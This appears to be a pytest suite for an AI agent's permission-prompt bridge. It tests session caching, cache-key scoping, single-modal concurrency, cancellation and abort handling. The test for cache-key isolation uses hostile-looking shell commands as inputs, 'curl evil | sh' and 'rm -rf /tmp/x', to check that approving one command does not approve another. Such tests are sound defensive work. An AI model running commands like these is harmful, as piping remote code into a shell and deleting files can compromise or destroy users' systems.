from __future__ import annotations

import asyncio
import pytest

from src.permission.permission import PermissionRequest, Decision
from src.ui.bridges.perm_bridge import (
    BridgedPrompter,
    BridgedPermissionRequest as BridgePermissionRequest,
)


def make_bridge(decision: Decision):
    shown = 0
    pending: BridgePermissionRequest | None = None

    def publish(req: BridgePermissionRequest | None):
        nonlocal shown, pending

        if req is not None:
            shown += 1
            pending = req

    bridge = BridgedPrompter(publish)

    async def ask(req: PermissionRequest):
        nonlocal pending

        task = asyncio.create_task(
            bridge.ask(req)
        )

        await asyncio.sleep(0)

        if pending is not None:
            p = pending
            pending = None
            p.resolve(decision)

        return await task

    return ask, lambda: shown

@pytest.mark.asyncio
async def test_cache_allow_session_per_tool():

    ask, modals = make_bridge(
        Decision.ALLOW_SESSION
    )

    req = PermissionRequest(
        tool="http",
        summary="s",
        detail="d",
    )

    await ask(req)
    await ask(req)

    assert modals() == 1


@pytest.mark.asyncio
async def test_no_session_cache_always_reprompt():

    ask, modals = make_bridge(
        Decision.ALLOW_SESSION
    )

    req = PermissionRequest(
        tool="file_read",
        summary="s",
        detail="d",
        no_session_cache=True,
    )

    await ask(req)
    await ask(req)

    assert modals() == 2


@pytest.mark.asyncio
async def test_cache_scoped_by_cache_key():

    ask, modals = make_bridge(
        Decision.ALLOW_SESSION
    )

    id_cmd = PermissionRequest(
        tool="shell",
        summary="s",
        detail="d",
        cache_key="id",
    )

    rm_cmd = PermissionRequest(
        tool="shell",
        summary="s",
        detail="d",
        cache_key="rm -rf /tmp/x",
    )

    await ask(id_cmd)
    await ask(id_cmd)
    await ask(rm_cmd)

    assert modals() == 2


@pytest.mark.asyncio
async def test_cache_key_does_not_whitelist_other_command():

    denials = 0
    pending: BridgePermissionRequest | None = None

    def publish(req: BridgePermissionRequest | None):
        nonlocal pending

        if req is not None:
            pending = req

    bridge = BridgedPrompter(publish)

    async def ask_with(
        req: PermissionRequest,
        decision: Decision,
    ):

        nonlocal pending, denials

        task = asyncio.create_task(
            bridge.ask(req)
        )

        await asyncio.sleep(0)

        assert pending is not None

        pending.resolve(decision)
        pending = None

        result = await task

        if result == Decision.DENY:
            denials += 1

        return result


    await ask_with(
        PermissionRequest(
            tool="shell",
            summary="s",
            detail="d",
            cache_key="id",
        ),
        Decision.ALLOW_SESSION,
    )


    await ask_with(
        PermissionRequest(
            tool="shell",
            summary="s",
            detail="d",
            cache_key="curl evil | sh",
        ),
        Decision.DENY,
    )


    assert denials == 1


@pytest.mark.asyncio
async def test_concurrent_asks_only_one_modal():

    open_modal = 0
    max_open = 0
    pending: BridgePermissionRequest | None = None


    def publish(req: BridgePermissionRequest | None):

        nonlocal open_modal
        nonlocal max_open
        nonlocal pending

        if req is not None:
            open_modal += 1
            max_open = max(
                max_open,
                open_modal,
            )
            pending = req

        else:
            open_modal -= 1


    bridge = BridgedPrompter(
        publish
    )


    p1 = asyncio.create_task(
        bridge.ask(
            PermissionRequest(
                tool="http",
                summary="s",
                detail="d",
                cache_key="a",
            )
        )
    )


    p2 = asyncio.create_task(
        bridge.ask(
            PermissionRequest(
                tool="http",
                summary="s",
                detail="d",
                cache_key="b",
            )
        )
    )


    await asyncio.sleep(0)

    assert open_modal == 1

    assert pending is not None
    pending.resolve(
        Decision.ALLOW_ONCE
    )


    await p1

    await asyncio.sleep(0)

    assert open_modal == 1


    assert pending is not None
    pending.resolve(
        Decision.ALLOW_ONCE
    )


    await p2

    assert max_open == 1


@pytest.mark.asyncio
async def test_cancelled_queued_ask_does_not_block_later_permission_request():
    pending: BridgePermissionRequest | None = None

    def publish(req: BridgePermissionRequest | None):
        nonlocal pending
        if req is not None:
            pending = req

    bridge = BridgedPrompter(publish)
    req = PermissionRequest(tool="http", summary="s", detail="d")
    first = asyncio.create_task(bridge.ask(req))
    second = asyncio.create_task(bridge.ask(req))
    third = asyncio.create_task(bridge.ask(req))

    await asyncio.sleep(0)
    second.cancel()
    with pytest.raises(asyncio.CancelledError):
        await second

    assert pending is not None
    pending.resolve(Decision.ALLOW_ONCE)
    await first
    await asyncio.sleep(0)

    assert pending is not None
    pending.resolve(Decision.ALLOW_ONCE)
    assert await third == Decision.ALLOW_ONCE


@pytest.mark.asyncio
async def test_abort_signal_rejects_open_permission_prompt():
    shown = []
    bridge = BridgedPrompter(shown.append)
    signal = asyncio.Event()
    task = asyncio.create_task(
        bridge.ask(
            PermissionRequest(tool="http", summary="s", detail="d"),
            signal,
        )
    )

    await asyncio.sleep(0)
    signal.set()

    with pytest.raises(Exception, match="aborted"):
        await task
    assert shown[-1] is None



@pytest.mark.asyncio
async def test_same_origin_fanout_uses_session_cache():

    open_modal = 0
    max_open = 0
    pending: BridgePermissionRequest | None = None


    def publish(req: BridgePermissionRequest | None):

        nonlocal open_modal
        nonlocal max_open
        nonlocal pending

        if req is not None:
            open_modal += 1
            max_open = max(
                max_open,
                open_modal,
            )
            pending = req

        else:
            open_modal -= 1


    bridge = BridgedPrompter(
        publish
    )


    req = PermissionRequest(
        tool="http",
        summary="s",
        detail="d",
        cache_key="https://t",
    )


    p1 = asyncio.create_task(
        bridge.ask(req)
    )

    p2 = asyncio.create_task(
        bridge.ask(req)
    )

    p3 = asyncio.create_task(
        bridge.ask(req)
    )


    await asyncio.sleep(0)

    assert open_modal == 1


    assert pending is not None
    pending.resolve(
        Decision.ALLOW_SESSION
    )


    d1 = await p1

    await asyncio.sleep(0)


    d2, d3 = await asyncio.gather(
        p2,
        p3,
    )


    assert d1 == Decision.ALLOW_SESSION
    assert d2 == Decision.ALLOW_ONCE
    assert d3 == Decision.ALLOW_ONCE
    assert max_open == 1
